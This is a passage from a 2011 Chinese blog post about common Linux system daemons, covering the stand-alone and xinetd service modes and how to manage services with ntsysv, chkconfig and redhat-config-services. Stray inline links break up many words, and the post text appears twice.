。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;93.yppasswdd：NIS口令服务器守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;94.ypserv：NIS主服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;95.yum：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>RPM</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>自动升级和软件包管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 二、守护进程工作原理和方式</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 在Cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt/Server模式下。服务器监听（Listen）在一个特定的端口上等待客户连接。连接成功后服务器和客户端通过端口进行数据通信。守护进程的工作就是打开一个端口，并且等待（Listen）进入连接。如果客户端产生一个连接请求，守护进程就创建（Fork）一个子服务器响应这个连接，而主服务器继续监听其他的服务请求。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.守护进程工作方式：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1）运行独立的守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 独立运行的守护进程由init脚本负责管理，所有独立运行的守护进程的脚本在/etc/rc.d/init.d/目录下。系统服务都是独立运行的守护进程包括：syslogd和cron等。运行独立的守护进程工作方式称作：stand－alone。它</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;传</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统的C/S模式的访问模式。服务器监听（Listen）在一个特点的端口上等待客户端的联机。如果客户端产生一个连接请求，守护进程就创建（Fork）一</p><p>&nbsp;&nbsp;&nbsp;&nbsp;个子服务器响应这个连接，而主服务器继续监听。以保持多个子服务器池等待下一个客户端请求。stand－alone模式工作原理见图1。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/75ea2d2fbe422bbb8b139956.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;          图1 stand－alone工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工作在stand－alone模式下的网络服务有route、gated。另外是大家最熟悉是Web服务器：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Ap</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ache和邮件服务器Sendmail、域名服务器Bind。因为这些负载很大服务器上，预先创子服务器，可以通过客户的服务速度。在</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;系统中通过stand－alone工作模式启动的服务由/etc/rc.d/下面对应的运行级别当中的符号链接启动。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（2）xinetd模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;从守护进程的概念可以看出，对于系统所要通过的每一种服务，都必须运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个监听某个端口连接所发生的守护进程，这通常意味着资源浪费。为了解决这个问题，Linux引进了“网络守护进程服务程序”的概念。Redhat</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux 9.0使用的网络守护进程是xinted（eXtended InterNET</p><p>&nbsp;&nbsp;&nbsp;&nbsp;daemon）。和stand－alone模式相比xinted模式也称 Internet</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Super－Server（超级服务器）。xinetd能够同时监听多个指定的端口，在接受用户请求时，他能够根据用户请求的端口不同，启动不同的网络服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务进程来处理这些用户请求。可以把xinetd看做一个管理启动服务的管理服务器，它决定把一个客户请求交给那个程序处理，然后启动相应的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd模式工作原理见图3。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/96e6d3ef3b8ee17063d09f56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;           图3  xinetd工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;stand－alone工作模式相比，系统不想要每一个网络服务进程都监听其服务端口。运行单个xinetd就可以同时监听所有服务端口，这样就降低了系</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统开销，保护系统资源。但是对于访问量大、经常出现并发访问时，xinetd想要频繁启动对应的网络服务进程，反而会导致系统性能下降。察看系统为</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux服务提供那种模式方法在Linux命令行可以使用pstree命令可以看到两种不同方式启动的网络服务。一般来说系统一些负载高的服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务：sendmail、Apache服务是单独启动的。而其他服务类型都可以使用xinetd超级服务器管理。查看目前运行的守护进程可以使用命</p><p>&nbsp;&nbsp;&nbsp;&nbsp;令：“pstree”</p><p>&nbsp;&nbsp;&nbsp;&nbsp;三、守护进程管理工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux提供了三种不同的守护进程管理工具：redhat－config－services、ntsysv、chkconfig，可以根据具体需要灵活运用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1） redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp;是一个一个图形化应用程序，它显示了每项服务的描述，以及每项服务是否在引导时启动（运行级别3、4、5），并允许你启动、停止、或重新启动/etc</p><p>&nbsp;&nbsp;&nbsp;&nbsp;/rc.d/init.d 中的哪些 SysV 服务，哪些 xinetd 服务。要从桌面启动服务配置工具，点击面板上的「主菜单」 =&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;「系统设置」 =&gt; 「服务器设置」 =&gt; 「服务」，或在 shell</p><p>&nbsp;&nbsp;&nbsp;&nbsp;提示下，键入命令：“redhat-config-services” （见图4）。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<i\nmg src=\"/images/pic/0d2a1924d14d7554908f9d56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp;  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    图4 redhat-config-services配置工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;config-services列出了 /etc/rc.d/init.d 中的服务和由 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;控制的服务。点击左侧列表中的服务名来显示该服务的简短描述以及它的服务状态。如果这个服务不是 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务，状态窗口会显示该服务目前是否在运行。如果该服务被 xinetd 所控制，状态窗口会显示「xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务」这个短语。要立即启动、停止、或重新启动某项服务，从列表中选择该项服务，然后点击工具栏上的相应按钮（或从「行动」拉下菜单中选择行动）。如果该</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务是一个 xinetd 服务，行动按钮会被禁用，因为它们不能被单个地启动或停止。 如果你通过选择或取消选择服务名旁的复选箱来启用或禁用了</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd 服务，你必须从拉下菜单中选择「文件」 =&gt; 「保存改变」来重新启动 xinetd，并立即启用或禁用你所改变的 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务。xinetd 还被配置成自动记忆设置。你可以同时启用或禁用多个 xinetd 服务，在结束后再保存改变。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; （2）ntsysv </p><p>&nbsp;&nbsp;&nbsp;&nbsp; ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工具为激活或停运服务提供了简单的界面。你可以使用 ntsysv 来启动或关闭由 xinetd 管理的服务。你还可以使用 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来配置运行级别。按照默认设置，只有当前运行级别会被配置。要配置不同的运行级别，使用 --level 选项来指定一个或多个运行级别。譬如，命令</p><p>&nbsp;&nbsp;&nbsp;&nbsp;ntsysv --level 345 配置运行级别3、4、和5。 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的工作界面见图1。使用上下箭头来上下查看列表。使用空格键来选择或取消选择服务，或用来“按”「确定」和「取消」按钮。要在服务列表和「确定」、「取</p><p>&nbsp;&nbsp;&nbsp;&nbsp;消」按钮中切换，使用 [Tab]键。* 标明某服务被设为启动。[F1] 键会弹出每项服务的简短描述。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;(3)chkconfig </p><p>&nbsp;&nbsp;&nbsp;&nbsp; chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令也可以用来激活和解除服务。chkconfig --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令显示系统服务列表，以及这些服务在运行级别0到6中已被启动（on）还是停止（off）。chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;还能用来设置某一服务在某一指定的运行级别内被启动还是被停运。譬如，要在运行级别3、4、5中停运 nfs 服务，使用下面的命令： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;chkconfig --level 345 nfs off</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 再结合一下脚本，需求不一样，自行修改。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; http://hi.baidu.com/key1088/blog/item/1e1cc63231a703b95fdf0e71.html</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 四、合理选择守护进程规避安全隐患</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 运行不必要或有漏洞的守护进程会给<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>带</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来安全和性能上的影响。对于系统安全来说，如果操作系统中的任何一个漏洞，都可能使整个系统受到攻击。所以，增加系统安全的最佳办法就是尽量监视系统的功</p><p>&nbsp;&nbsp;&nbsp;&nbsp;能。文章开始介绍了重要的守护进程，其中“crond、syslog、keytable、xinetd、kudzu、iptables”等是需要运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的，echo、echo-udp、daytime、daytime-udp、chargen、chargen-udp主要是做调试用，普通用户基本用不</p><p>&nbsp;&nbsp;&nbsp;&nbsp;到，可以关闭。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; r字开头的守护进程：rsh、rstatd、rsync、ruser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;rwalld这些命令都是Berkley远程命令，因为都以字母r开头，故称r*命令。主要使用来使一台计算机上的某个用户以相同的帐户远程执行另一台计</p><p>&nbsp;&nbsp;&nbsp;&nbsp;算机的一个程序。但是，r命令已经被证实存在安全风险。对于确实需要的守护进程，应该尽量选用最新的版本程序，并增加其安全防范。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 另外我们还要合理选择守护进程例如innd是运行新闻组服务的进程，如果用户不做Usenet服务器，应该关掉。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;总结：</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 基于开放源代码的Linux给用户提供了这样一个平台：可以根据自己的软、硬件环境，定制自己的Linux守护进程。因此，根据每个用户不同的应用范围定制应用环境，可以将Linux系统的安全和性能提升到新的高度。 </p><p>&nbsp;</p><p>&nbsp;</p>","source":"_posts/linux-常见服务.md","raw":"title: linux 常见服务\ncategories: [Linux]\ntags: []\ndate: 2011-04-11 09:23:00\n---\n<p>&nbsp; <a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务器在启动时需要启动很多系统服务，它们向本地和网络用户提供了Linux的系统功能接口，直接面向应用程序和用户。提供这些服务的程序是由运行在后台的守护进程（daemons）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来执行的。守护进程是生存期长的一种进程。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。他们常常在系统引导装入时启动，在系统</p><p>&nbsp;&nbsp;&nbsp;&nbsp;关闭时终止。linux系统有很多守护进程，大多数服务器都是用守护进程实现的。同时，守护进程完成许多系统任务，比如，作业规划进程crond、打印进</p><p>&nbsp;&nbsp;&nbsp;&nbsp;程lqd等。有些书籍和资料也把守护进程称作：“服务”。选择运行哪些守护进程，要根据具体需求决定。查看系统可以提供的守护进程对应的服务，使用下面方</p><p>&nbsp;&nbsp;&nbsp;&nbsp;法，以root权限运行： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;#ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/8de818da5f4ed57b10df9b56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;   图1 可以选择的系统服务 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 界面如图1所示的窗口，下面详细介绍一下各项系统服务的功能。以英文字母为序： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    一、Linux守护进程简介</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1.alsasound</p><p>&nbsp;&nbsp;&nbsp;&nbsp;：Alsa声卡驱动守护程序。Alsa声卡驱动程序本来是为了 一种声卡Gravis UltraSound(GUS)而写的，该程序被证</p><p>&nbsp;&nbsp;&nbsp;&nbsp;明很优秀，于是作者就开始为一般的声卡写 驱动程序。 Alsa和OSS/Free 及OSS/Linux兼容，但是有自己的接</p><p>&nbsp;&nbsp;&nbsp;&nbsp;口，甚至比OSS优秀。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.acpid：acpid（Advanced Configuration and Power Interface）是为替代传统的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://wiki.ccw.com.cn/APhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>AP</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;M电源管理标准而推出的新型电源管理标准。通常笔记本电脑需要启动电源进行管理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3.atalk：AppleTalk网络守护进程。注意不要在后台运行该程序，该程序的数据结构必须在运行其他进程前先花一定时间初始化。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;4.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://topic.ccw.com.cn/corpCenter/592.htmlhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>amd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;： 自动安装NFS守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;5.anacron：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个自动化运行任务守护进程。Red Hat Linux 随带四个自动化任务的工具：cron、 anacron、at、和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;batc。当你的Linux服务器并不是全天运行，这个anacron就可以帮你执行在&quot;crontab&quot;设定的时间内没有执行的工作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;6.apmd：apmd（Advanced Power Management）是高级电源管理。传统的电源管理标准，对于笔记本电脑比较有用，可以了解系统的电池电量信息。并将相关信息通过syslogd 写入日志。也可以用来在电源不足时关机。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;7.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>arp</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tables_jf ：为arptables网络的用户控制过滤的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;8.arpwatch： 记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>数据库</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong> 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;atd：at和batch命令守护进程，用户用at命令调度的任务。Batch用于在系统负荷比较低时  运行批处理任务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;9.autofs：自动安装管理进程automount，与NFS相关，依赖于NIS服务器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;10.bootparamd：引导参数服务器，为LAN上的无盘工作站提供引导所需的相关信息。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;11.bluetooch：蓝牙服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;12.crond ：cron是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;下的一个传统程序，该程序周期地运行用户 调度的任务。比起传统的Unix版本，Linux版本添加了不少属性，而且更安全，配置更简单。类似计划任务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;13.chargen：使用tcp协议的chargen server，chargen（Character Generator  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Pro</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tocol）是一种网络服务，主要功能是提供类似远程打字的功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;14.chargen-udp：使用UDP协议的chargen server。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;15.cpuspeed：监测系统空闲百分比，降低或加快CPU时钟速度和电压从而在系统空闲时将能源消耗降为最小，而在系统繁忙时最大化加快系统执行速度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;16.dhcpd：动态主机控制协议(Dynamic Host Control Protocol)的服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;17.cups： cups(Common UNIX Printing System)是通用UNIX打印守护进程，为Linux提供第三代打印功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;18.cups－config－daemons：cups打印系统切换守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;19.cups-lpd：cups行打印守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;20.daytime：使用TCP 协议的Daytime守护进程，该协议为客户机实现从远程服务器获取日期 和时间的功能。预设端口：13。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;21.daytime-udp：使用UDP 协议的Daytime守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;22.dc_server：使用SSL安全套接字的代理服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;23.dc_cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt：使用SSL安全套接字的客户端守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;24.diskdump：服务器磁盘备份守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;25.echo：服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;26.echo-udp：使用UDP协议的服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;27.eklogin：接受rlogin会话鉴证和用kerberos5加密的一种服务的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;28.gated ：网关路由守护进程。它支持各种路由协议，包括RIP版本1和2、DCN HELLO协议、 OSPF版本2以及EGP版本2到4。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;29.gpm：gpm（General Purpose Mouse Daemon ）守护进程为文本模式下的Linux程序如mc(Midnight Commander)提供了鼠标的支持。它也支持控制台下鼠标 的拷贝，粘贴操作以及弹出式菜单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;30.gssftp： 使用kerberos 5认证的ftp守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;31.httpd：Web服务器Apache守护进程，可用来提供HTML文件以 及CGI动态内容服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;32.inetd ：因特网操作守护程序。监控网络对各种它管理的服务的需求，并在必要的时候启动相应的服务程序。在Redhat 和Mandrake linux中被\nxinetd代替。Debian, Slackware, </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>SuSE</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;仍然使用。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;33.innd：Usenet新闻服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;34.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ii</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;im：中文输入法服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;35.iptables：iptables防火墙守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;36.irda：红外端口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;37.i</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;n：isdn启动和中止服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;38.krb5－telnet:使用kerberos 5认证的telnet守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;39.klogin：远程登陆守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;40.keytable： 该进程的功能是转载在/etc/sysconfig/keyboards里定义的键盘映射表，该表可以通过kbdconfig工具进行选择。您应该使该程序处于激活状态。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;41.irqbalance：对多个系统处理器环境下的系统中断请求进行负载平衡的守护程序。如果你只安装了一个CPU，就不需要加载这个守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;42.kshell ：kshell守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;43.kudzu：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;硬件自动检测程序，会自动检测硬件是否发生变动，并相应进行硬件的添加、删除工作。当系统启动时，kudzu会对当前的硬件进行检测，并且和存储</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在     </p><p>&nbsp;&nbsp;&nbsp;&nbsp;/etc/sysconfig/hwconf中的硬件信息进行对照，如果某个硬件从系统中被添加或者删除时，那么kudzu就会察觉到，并且通知用户是否</p><p>&nbsp;&nbsp;&nbsp;&nbsp;进行相关配置，然后修改etc/sysconfig/hwconf，使硬件资料与系统保持同步。如果/etc/sysconfig/hwconf这个文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;不存在，那么kudzu将会从/etc/modprobe.conf，/etc/sysconfig/network-scripts/和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;etc/X11/XF86Config中探测已经存在的硬件。如果你不打算增加新硬件，那么就可以关闭这个启动服务，以加快系统启动时间。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;44.ldap：ldap（Lightweight Directory Access Protocol）目录访问协议服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;45.lm_ser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>oem</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;s：检测主板工作情况守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;46.lpd ：lpd是老式打印守护程序，负责将lpr等程序提交给打印 作业。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;47.mdmonitor：RAID相关设备的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;48.messagebus：D-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;BUS是一个库，为两个或两个以上的应用程序提供一对一的通讯。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;dbus-daemon-1是一个应用程序，它使用这个库来实现messagebus守护程序。多个应用程序通过连接messagebus守护程序可以实</p><p>&nbsp;&nbsp;&nbsp;&nbsp;现与其他程序交换信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;49.microcode_ctl：可编码以及发送新的微代码到内核以更新</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Intel</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp; IA32系列处理器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;50.mysqld： 一个快速高效可靠的轻型SQL数据库引擎守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;51.named：DNS（BIND）服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;52.netplugd：netplugd（network </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ca</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ble hotplug management daemon）守护程序，用于监控一个或多个网络接口的状态，当某些事件触发时运行一个外部脚本程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;53.netdump：远程网络备份服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;54.netfs：Network Filesystem Mounter，该进程安装和卸载NFS、SAMBA和NCP网络文件系统。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;55.nfs：网络文件系统守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;56.nfslock：NFS是一个流行的通过TCP/IP网络共享文件的协议，此守护进程提供了NFS文件锁定功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;57.ntpd：Network time Protocol daemon（网络时间校正协议）。ntpd是用来使系统和一个精确的时间源保持时间同步的协议守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;58.network：激活/关闭启动时的各个网络接口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;59.psacct：该守护进程包括几个工具用来监控进程活动的工具，包括ac,lastcomm, accton 和sa。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;60.pcmcia：主要用于支持笔记本电脑接口守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;61.portmap：该守护进程用来支持RPC连接，RPC被用于NFS以及NIS 等服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;62.postgresql: PostgreSQL 关系数据库引擎。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;63.proftpd: proftpd 是Unix下的一个配置灵活的ftp服务器的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;64.pppoe：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ADSL</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;连接守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;65.random ：保存和恢复系统的高质量随机数生成器，这些随机数是系 统一些随机行为提供的。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;66.rawdevices：在使用集群文件系统时用于加载raw设备的守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;67.readahead、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;readahead_early：readahead和readahead_early是在Fedora 